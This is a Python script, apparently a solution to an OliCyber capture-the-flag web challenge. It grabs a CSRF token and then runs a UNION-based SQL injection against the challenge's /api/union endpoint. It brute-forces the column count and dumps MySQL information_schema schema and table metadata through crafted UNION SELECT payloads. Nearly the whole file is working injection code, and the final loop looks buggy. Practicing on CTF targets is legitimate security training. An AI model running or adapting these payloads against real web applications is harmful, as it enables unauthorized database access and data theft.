import json
import requests
from CSRF import sniff_csrf
session = requests.Session()
import pandas as pd

base = "http://web-17.challs.olicyber.it"
api = base + "/api/union"

# se non hai già la cookie/session acquisita, vai prima sulla pagina:
session.get(base + "/union", timeout=10)
Result = sniff_csrf(base, do_test_post=True, session=session, verbose=True)
print("Sniffed CSRF results:", Result)
csrf_value = None
for src, name, val in Result.get("findings_html", []):
    if src == "js-token" and val:
        csrf_value = val
        break

if not csrf_value:
    print("Nessun js-token trovato; esco.")
    raise SystemExit(1)
# token che hai visto nel browser (sostituisci con il token che hai)
csrf_token = csrf_value
headers = {
    "Accept": "application/json, text/javascript, */*; q=0.01",
    "Content-Type": "application/json; charset=UTF-8",
    "X-CSRFToken": csrf_token,
    "X-Requested-With": "XMLHttpRequest",
    "Origin": "http://web-17.challs.olicyber.it",
    "Referer": "http://web-17.challs.olicyber.it/union",
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36",
}

def post_json(payload_obj):
    j = json.dumps(payload_obj)
    r = session.post(api, data=j, headers=headers, timeout=10)
    print("status:", r.status_code)
    print("len(resp):", len(r.text))
    print("resp snippet:", r.text[:800])
    return r

# esempio minimale identico al browser (campo 'query' — adattalo se differente)
resp = post_json({"query": "1"})
def collonNumberFindeBrutal(collumstring=""):
    for i in range(1, 11):
        # aggiunge una colonna alla volta
        if i !=1:
            collumstring += ","
            
        collumstring += str(i)
        
        # se non è l'ultima colonna, aggiunge una virgola
        
        
        payload = {
            "query": f"1' AND 1=0 UNION SELECT {collumstring} -- "
        }
        resp=post_json(payload)
        myjson=json.loads(resp.text)
        if myjson['sql_error'] is '':
            return i

def informationSchema_InformationExtraction(listOfInfoSchemaColumns, info,numer, where="*"):
    baseQuery = "1' AND 1=0 "
    per_row_expr = "CONCAT_WS(':', " + ", ".join(listOfInfoSchemaColumns) + ")"
    intemediad = f"GROUP_CONCAT({per_row_expr} SEPARATOR '; ')"

    # Crea una lista di colonne: la prima con i dati, le altre con NULL
    columns = [intemediad] + ["NULL"] * (numer - 1)
    select_clause = ", ".join(columns)

    advanceQuery = f"UNION SELECT {select_clause} FROM information_schema.{info}"
    Where=f"WHERE {where}" if where!="*" else ""
    comment="-- "
    payload = {
        "query": f"{baseQuery} {advanceQuery} {Where} {comment}"
    }
    print(payload)

    # Richiesta
    resp = post_json(payload)
    resp = json.loads(resp.text)
    result_str = resp['result']

    # Parse in DataFrame
    rows = result_str.split('; ')
    data = []
    for r in rows:
        r_clean = r.split(',')[0]  # rimuove eventuali valori extra
        cols = r_clean.split(':')
        # Assicuriamoci che ci siano esattamente len(listOfInfoSchemaColumns) colonne
        while len(cols) < len(listOfInfoSchemaColumns):
            cols.append(None)
        data.append(dict(zip(listOfInfoSchemaColumns, cols)))

    df = pd.DataFrame(data)
    return df

            

numer = collonNumberFindeBrutal()
listOfInfoSchemaColumns = ["CATALOG_NAME","SCHEMA_NAME","DEFAULT_CHARACTER_SET_NAME",
                               "DEFAULT_COLLATION_NAME","SQL_PATH","DEFAULT_ENCRYPTION"]
df=informationSchema_InformationExtraction(info="SCHEMATA",listOfInfoSchemaColumns=listOfInfoSchemaColumns,numer=numer)
# Lista dei database di sistema MySQL tipici
system_dbs = {"mysql", "information_schema", "performance_schema", "sys"}

# Supponiamo di avere già il DataFrame df con SCHEMATA
# df = informationSchema_InformationExtraction(info="SCHEMATA", listOfInfoSchemaColumns=[...])

# DataFrame dei database di sistema
df_system = df[df['SCHEMA_NAME'].isin(system_dbs)].reset_index(drop=True)

# DataFrame dei database applicativi
df_application = df[~df['SCHEMA_NAME'].isin(system_dbs)].reset_index(drop=True)
print(df_application)
print("-----")
print(df_system)
print("-----")


l2=["TABLE_NAME", "ENGINE", "VERSION", "ROW_FORMAT", "TABLE_ROWS", "AVG_ROW_LENGTH",
    "DATA_LENGTH", "MAX_DATA_LENGTH", "INDEX_LENGTH", "DATA_FREE", "AUTO_INCREMENT",
    "CREATE_TIME", "UPDATE_TIME", "CHECK_TIME", "TABLE_COLLATION", "CHECKSUM",
    "CREATE_OPTIONS", "TABLE_COMMENT"]
map_of_dfs = {}
for index, row in df_application.iterrows():
    
   map_of_dfs[row['SCHEMA_NAME']]=informationSchema_InformationExtraction(info="TABLES",listOfInfoSchemaColumns=l2,numer=numer,where=f"TABLE_SCHEMA='{row['SCHEMA_NAME']}'")
#print(map_of_dfs)
map_columns = {}
for db_name, df_tables in map_of_dfs.items():
    print(f"Database: {db_name}")
    print(df_tables)
    print("-----")
    for index, row in df_tables.iterrows():
        map_of_dfs[row['SCHEMA_NAME']]=informationSchema_InformationExtraction(info="TABLES",listOfInfoSchemaColumns=l2,numer=numer,where=f"TABLE_SCHEMA='{row['SCHEMA_NAME']}'")
